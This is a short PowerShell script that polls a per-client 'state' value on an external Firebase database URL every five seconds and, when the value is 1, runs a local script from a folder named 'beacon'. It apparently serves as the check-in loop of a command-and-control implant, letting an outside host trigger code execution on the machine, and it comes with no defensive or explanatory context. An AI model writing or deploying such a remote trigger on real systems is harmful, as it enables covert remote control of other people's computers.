$client = "client_2"
$url = "https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/$client/state.json"

while ($true) {
    $response = Invoke-RestMethod -Uri $url
    $state = $response
    Write-Output $state

    if ($state -eq 1) {
        C:\temp\beacon\TCPState.ps1
    }

    Start-Sleep -Seconds 5
}
